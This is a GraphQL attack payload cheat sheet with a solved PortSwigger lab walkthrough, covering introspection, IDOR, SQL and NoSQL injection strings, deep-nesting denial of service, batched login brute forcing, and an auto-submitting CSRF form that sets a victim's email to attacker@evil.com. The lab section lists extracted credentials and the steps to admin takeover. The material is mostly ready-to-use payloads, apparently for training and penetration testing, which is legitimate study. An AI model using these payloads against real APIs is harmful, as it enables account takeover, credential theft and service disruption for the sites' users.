# GraphQL Attacks - Payload Reference

## Introspection
```graphql
# Full schema introspection
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Type introspection
{
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}
```

## Information Disclosure
```graphql
# Discover hidden fields
{
  users {
    id
    username
    email
    password
    role
    isAdmin
  }
}
```

## IDOR via GraphQL
```graphql
# Change ID to access other users
{
  user(id: 1) { username email }
  user(id: 2) { username email }
}
```

## Injection via GraphQL
```graphql
# SQL injection in GraphQL argument
{
  user(username: "admin' OR '1'='1") { id }
}

# NoSQL injection
{
  user(filter: "{username: {$gt: ''}}") { id }
}
```

## Denial of Service
```graphql
# Deep nested query
{
  user {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

## PortSwigger Lab Approach
1. Send introspection query to discover schema
2. Look for hidden fields (password, role, isAdmin)
3. Test for IDOR by changing IDs
4. Test for injection in arguments
5. Check for information disclosure in error messages

## Brute Force via Batching (PortSwigger Lab)
```json
[
  {"query": "mutation{login(username:\"carlos\",password:\"123456\"){token}}"},
  {"query": "mutation{login(username:\"carlos\",password:\"password\"){token}}"},
  {"query": "mutation{login(username:\"carlos\",password:\"admin\"){token}}"}
]
```

## CSRF via GraphQL
```html
<form method="POST" action="https://TARGET/graphql">
  <input type="hidden" name="query" value='mutation{changeEmail(email:"attacker@evil.com"){success}}'/>
</form>
<script>document.forms[0].submit();</script>
```

## Endpoint Discovery
```
/graphql, /graphiql, /api/graphql, /v1/graphql, /v2/graphql
/query, /gql, /graph, /playground, /altair
```

## Detection Queries
```graphql
{__schema{queryType{name}}}
{__schema{mutationType{name fields{name}}}}
```

## Verified Lab Solution: Accidental Exposure of Private GraphQL Fields

**Lab #37** - SOLVED 2026-07-07

### Attack Chain
1. **Endpoint Discovery**: Read `/resources/js/gqlUtil.js` → found `/graphql/v1`
2. **Introspection**: `{__schema{types{name fields{name}}}}` → full schema exposed
3. **Schema Analysis**: User type had `id`, `username`, `password` fields
4. **Data Extraction**: 
   ```
   {getUser(id:1){id username password}} → administrator / x8ogua73861ggg3zik5v
   {getUser(id:2){id username password}} → wiener / peter
   {getUser(id:3){id username password}} → carlos / qk7k0js05yl7secjmqow
   ```
5. **Login as Admin**: Used `login` mutation with extracted credentials
6. **Account Takeover**: Navigated to /admin, deleted carlos

### Key Lessons
- Always check JavaScript sources for API endpoints
- GraphQL introspection should be disabled in production
- Password fields should NEVER be in GraphQL types
- getUser(id) queries need access control
